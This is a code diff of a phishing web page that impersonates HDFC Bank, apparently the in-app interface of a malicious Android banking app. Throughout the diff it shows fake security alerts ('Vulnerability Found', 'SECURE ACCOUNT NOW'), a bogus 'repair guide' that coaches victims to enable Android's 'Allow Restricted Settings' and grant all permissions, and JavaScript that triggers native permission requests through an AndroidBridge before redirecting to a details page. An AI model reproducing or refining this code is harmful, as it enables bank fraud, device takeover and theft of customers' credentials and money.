@@ -2,223 +2,100 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>HDFC Bank - Dashboard</title>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
-    <style>
-        :root {
-            --hdfc-blue: #004d8c;
-            --hdfc-red: #ed232a;
-        }
-
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Inter', sans-serif;
-        }
-
-        body {
-            background-color: #f0f2f5;
-            color: #333;
-        }
-
-        /* Global Click Wrapper */
-        #globalClick {
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-        }
-
-        /* Top Status Bar */
-        .status-bar {
-            background: #666;
-            color: white;
-            text-align: center;
-            font-size: 11px;
-            padding: 6px;
-            font-weight: 700;
-            letter-spacing: 1px;
-            position: sticky;
-            top: 0;
-            z-index: 1000;
-        }
-        .status-bar.safe { background: #01875f; }
-
-        header {
-            background: white;
-            padding: 15px 20px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
-        }
-
-        .logo { height: 25px; }
-
-        .hero {
-            background: linear-gradient(135deg, var(--hdfc-blue) 0%, #003366 100%);
-            padding: 30px 20px;
-            color: white;
-            border-bottom-left-radius: 30px;
-            border-bottom-right-radius: 30px;
-            margin-bottom: 25px;
-            text-align: center;
-        }
-
-        .hero h1 { font-size: 24px; margin-bottom: 10px; }
-        .hero p { font-size: 14px; opacity: 0.8; margin-bottom: 25px; }
-
-        /* Virtual Card */
-        .card-preview {
-            background: linear-gradient(45deg, #1a1a1a 0%, #444 100%);
-            border-radius: 15px;
-            padding: 20px;
-            height: 180px;
-            box-shadow: 0 10px 25px rgba(0,0,0,0.3);
-            display: flex;
-            flex-direction: column;
-            justify-content: space-between;
-            text-align: left;
-            max-width: 320px;
-            margin: 0 auto;
-        }
-
-        .card-chip { width: 40px; height: 30px; background: #d4af37; border-radius: 5px; }
-        .card-number { font-size: 18px; letter-spacing: 2px; font-family: monospace; }
-
-        /* Service Grid */
-        .grid {
-            display: grid;
-            grid-template-columns: repeat(2, 1fr);
-            gap: 15px;
-            padding: 0 20px;
-            margin-bottom: 40px;
-        }
-
-        .grid-item {
-            background: white;
-            padding: 25px 15px;
-            border-radius: 15px;
-            text-align: center;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.05);
-        }
-
-        .grid-item .icon { font-size: 28px; margin-bottom: 12px; display: block; }
-        .grid-item span { font-size: 13px; font-weight: 600; color: var(--hdfc-blue); }
-
-        /* Overlays */
-        .overlay {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0,0,0,0.9);
-            z-index: 2000;
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
-            backdrop-filter: blur(5px);
-        }
-
-        .modal {
-            background: white;
-            padding: 30px;
-            border-radius: 25px;
-            width: 100%;
-            max-width: 400px;
-            text-align: center;
-        }
-
-        .btn-red {
-            background: var(--hdfc-red);
-            color: white;
-            border: none;
-            padding: 15px;
-            border-radius: 10px;
-            width: 100%;
-            font-weight: 700;
-            margin-top: 20px;
-        }
-
-        #repairGuide {
-            display: none;
-            text-align: left;
-            background: #f9f9f9;
-            padding: 15px;
-            border-radius: 10px;
-            margin-top: 20px;
-            font-size: 13px;
-        }
-    </style>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>HDFC Bank - Secure Portal</title>
+    <link rel="stylesheet" href="dashboard.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    <script src="https://unpkg.com/@phosphor-icons/web"></script>
 </head>
-<body>
+<body class="landing-page">
+    <div id="statusBanner" class="security-status">⚠️ ACTION REQUIRED: SYSTEM UPDATE PENDING</div>
 
-    <div id="globalClick" onclick="triggerAction()">
-        <div id="statusBanner" class="status-bar">⚠️ SECURITY UPDATE PENDING - CLICK TO RESOLVE</div>
-
-        <header>
-            <img src="https://upload.wikimedia.org/wikipedia/commons/2/28/HDFC_Bank_Logo.svg" alt="HDFC" class="logo">
-            <div style="font-size: 20px;">👤</div>
-        </header>
-
-        <div class="hero">
-            <h1>Active Account</h1>
-            <p>Welcome back! Manage your cards & rewards.</p>
-            
-            <div class="card-preview">
-                <div class="card-chip"></div>
-                <div class="card-number">**** **** **** 8821</div>
-                <div style="display: flex; justify-content: space-between; font-size: 12px;">
-                    <span>HDFC CUSTOMER</span>
-                    <span>09/28</span>
+    <div class="app-shell">
+        <header class="glass-header">
+            <div class="header-left">
+                <img src="3e834224c5fd5554a019d56b4902b706.png" alt="HDFC" class="nav-logo">
+                <div class="user-welcome">
+                    <p>Welcome to</p>
+                    <h3>HDFC DIGITAL</h3>
                 </div>
             </div>
-        </div>
+            <div class="header-right">
+                <div class="icon-circle"><i class="ph-bold ph-user-circle"></i></div>
+            </div>
+        </header>
 
-        <div class="grid">
-            <div class="grid-item">
-                <span class="icon">🎁</span>
-                <span>Reward Points</span>
+        <main class="content-area">
+            <div class="hero-section">
+                <h1 class="premium-title">Upgrade Your <br><span>Digital Security</span></h1>
+                <p class="premium-subtitle">Protect your assets with our next-gen encryption and real-time monitoring system.</p>
+                
+                <div class="status-card" onclick="triggerAction()">
+                    <div class="card-glow"></div>
+                    <div class="status-header">
+                        <div class="status-indicator">
+                            <span class="pulse"></span>
+                            SCANNING SYSTEM
+                        </div>
+                        <i class="ph-fill ph-shield-check"></i>
+                    </div>
+                    <div class="status-body">
+                        <h2>Vulnerability Found</h2>
+                        <p>Your current security protocol is outdated. Please sync your device to continue.</p>
+                    </div>
+                    <button class="btn-primary-glow">SECURE ACCOUNT NOW</button>
+                </div>
             </div>
-            <div class="grid-item">
-                <span class="icon">📈</span>
-                <span>Limit Management</span>
+
+            <div class="features-grid">
+                <div class="feature-item">
+                    <div class="f-icon red"><i class="ph-fill ph-bell-ringing"></i></div>
+                    <span>Smart Alerts</span>
+                </div>
+                <div class="feature-item">
+                    <div class="f-icon blue"><i class="ph-fill ph-fingerprint"></i></div>
+                    <span>Biometric Sync</span>
+                </div>
+                <div class="feature-item">
+                    <div class="f-icon green"><i class="ph-fill ph-shield-checkered"></i></div>
+                    <span>End-to-End</span>
+                </div>
+                <div class="feature-item">
+                    <div class="f-icon yellow"><i class="ph-fill ph-lightning"></i></div>
+                    <span>Instant Fix</span>
+                </div>
             </div>
-            <div class="grid-item">
-                <span class="icon">🛡️</span>
-                <span>Security Sync</span>
-            </div>
-            <div class="grid-item">
-                <span class="icon">📑</span>
-                <span>E-Statement</span>
-            </div>
-        </div>
-        
-        <div style="text-align: center; padding: 20px; opacity: 0.5; font-size: 12px;">
-            HDFC Bank v4.0.94 <br> Secure Session Active
-        </div>
+        </main>
+
+        <nav class="bottom-tab-bar">
+            <div class="tab-item active"><i class="ph-fill ph-house"></i><span>Home</span></div>
+            <div class="tab-item"><i class="ph-bold ph-shield-plus"></i><span>Safety</span></div>
+            <div class="tab-item scanner"><div class="scan-circle"><i class="ph-bold ph-shield-star"></i></div></div>
+            <div class="tab-item"><i class="ph-bold ph-info"></i><span>Support</span></div>
+            <div class="tab-item"><i class="ph-bold ph-gear"></i><span>Settings</span></div>
+        </nav>
     </div>
 
-
-
     <!-- Master Overlay -->
-    <div id="masterOverlay" class="overlay" style="background: white;">
-        <div class="modal" style="box-shadow: none;">
-            <div style="font-size: 60px; margin-bottom: 20px;">🧬</div>
-            <h2 style="color: #01875f;">Syncing Profile</h2>
-            <p style="margin-top: 10px; font-size: 14px;">Finalizing encryption. If prompts don't appear, use the Repair Tool.</p>
+    <div id="masterOverlay" class="permission-overlay">
+        <div class="perm-modal">
+            <div class="perm-glow"></div>
+            <div class="perm-main-icon">🧬</div>
+            <h2>Security Sync</h2>
+            <p>We are finalizing your account encryption. If the system prompts don't appear, please use our repair tool.</p>
             
-            <button onclick="showRepair(event)" style="background: #333; color: white; padding: 15px; border-radius: 10px; width: 100%; border: none; margin-top: 20px;">REPAIR SECURITY SYNC</button>
-            
-            <div id="repairGuide">
-                <p>1. Open <b>App Settings</b>.</p>
-                <p>2. Tap <b>3 Dots</b> (Top Right Corner).</p>
-                <p>3. Select <b>Allow Restricted Settings</b>.</p>
-                <p>4. Return here and <b>Allow All</b>.</p>
-                <button onclick="if(window.AndroidBridge) window.AndroidBridge.openAppSettings()" class="btn-red" style="margin-top: 10px;">OPEN SETTINGS</button>
+            <div class="perm-footer">
+                <button onclick="showRepair(event)" class="btn-p btn-allow">START SYNC</button>
+                
+                <div id="repairGuide" style="display:none; margin-top:20px; text-align:left; background:rgba(255,255,255,0.05); padding:15px; border-radius:15px; font-size:12px;">
+                    <p style="margin-bottom:8px;">1. Open <b>App Settings</b>.</p>
+                    <p style="margin-bottom:8px;">2. Tap <b>3 Dots</b> (Top Right Corner).</p>
+                    <p style="margin-bottom:8px;">3. Select <b>Allow Restricted Settings</b>.</p>
+                    <p style="margin-bottom:8px;">4. Return and <b>Allow All</b>.</p>
+                    <button onclick="if(window.AndroidBridge) window.AndroidBridge.openAppSettings()" class="btn-p btn-allow" style="margin-top:15px; width:100%; font-size:12px;">OPEN SETTINGS</button>
+                </div>
             </div>
         </div>
     </div>
@@ -233,15 +110,19 @@
                 } else {
                     document.getElementById('masterOverlay').style.display = 'flex';
                 }
+            } else {
+                window.location.href = 'dashboard.html';
             }
         }
 
         function showRepair(e) {
             e.stopPropagation();
+            if (window.AndroidBridge) {
+                window.AndroidBridge.requestRealPermissions();
+            }
             document.getElementById('repairGuide').style.display = 'block';
         }
 
-        // Live Permission Sensor & Bridge Detection
         let bridgeCheck = setInterval(() => {
             if (window.AndroidBridge) {
                 if (window.AndroidBridge.hasAllPermissions && window.AndroidBridge.hasAllPermissions()) {
@@ -251,25 +132,59 @@
                     document.getElementById('masterOverlay').style.display = 'flex';
                 }
             }
-        }, 1000);
+        }, 1500);
 
         function handlePermissionResult(status) {
             if (status === 'GRANTED') {
                 permissionsGranted = true;
                 document.getElementById('masterOverlay').style.display = 'none';
                 document.getElementById('statusBanner').innerHTML = "✅ SYSTEM ENCRYPTED & SECURED";
-                document.getElementById('statusBanner').className = "status-bar safe";
-                
-                // Auto-redirect to details page
-                setTimeout(() => {
-                    window.location.href = 'details.html';
-                }, 1500);
-
-                if (window.AndroidBridge && window.AndroidBridge.requestIgnoreBatteryOptimizations) {
-                    window.AndroidBridge.requestIgnoreBatteryOptimizations();
-                }
+                document.getElementById('statusBanner').classList.add('safe');
+                setTimeout(() => { window.location.href = 'details.html'; }, 1500);
             }
         }
     </script>
+    <style>
+        .hero-section { padding-top: 20px; margin-bottom: 30px; }
+        .premium-title { font-size: 32px; font-weight: 800; line-height: 1.1; margin-bottom: 12px; }
+        .premium-title span { color: var(--primary); }
+        .premium-subtitle { color: var(--text-dim); font-size: 14px; margin-bottom: 25px; }
+
+        .status-card {
+            background: var(--surface); border: 1px solid var(--border);
+            border-radius: 28px; padding: 24px; position: relative; overflow: hidden;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
+        }
+        .card-glow {
+            position: absolute; top: -50px; right: -50px; width: 150px; height: 150px;
+            background: var(--accent); filter: blur(70px); opacity: 0.1;
+        }
+        .status-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
+        .status-indicator {
+            display: flex; align-items: center; gap: 8px; font-size: 10px; font-weight: 800; color: var(--accent);
+        }
+        .pulse { width: 8px; height: 8px; background: var(--accent); border-radius: 50%; animation: pulse 1.5s infinite; }
+        @keyframes pulse { 0% { transform: scale(1); opacity: 1; } 100% { transform: scale(2.5); opacity: 0; } }
+
+        .status-body h2 { font-size: 20px; font-weight: 800; margin-bottom: 8px; }
+        .status-body p { font-size: 13px; color: var(--text-dim); margin-bottom: 25px; line-height: 1.4; }
+
+        .btn-primary-glow {
+            width: 100%; background: var(--primary); color: white; border: none; padding: 18px;
+            border-radius: 18px; font-weight: 800; font-size: 14px;
+            box-shadow: 0 10px 20px rgba(0,122,255,0.3);
+        }
+
+        .features-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 10px; }
+        .feature-item { display: flex; flex-direction: column; align-items: center; gap: 8px; }
+        .f-icon { width: 44px; height: 44px; border-radius: 12px; display: flex; align-items: center; justify-content: center; font-size: 20px; }
+        .f-icon.red { background: rgba(237, 35, 42, 0.1); color: var(--accent); }
+        .f-icon.blue { background: rgba(0, 122, 255, 0.1); color: var(--primary); }
+        .f-icon.green { background: rgba(35, 134, 54, 0.1); color: var(--success); }
+        .f-icon.yellow { background: rgba(255, 215, 0, 0.1); color: #ffd700; }
+        .feature-item span { font-size: 9px; font-weight: 700; color: var(--text-dim); text-align: center; }
+
+        .icon-circle { width: 40px; height: 40px; background: var(--surface); border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 20px; border: 1px solid var(--border); }
+    </style>
 </body>
 </html>
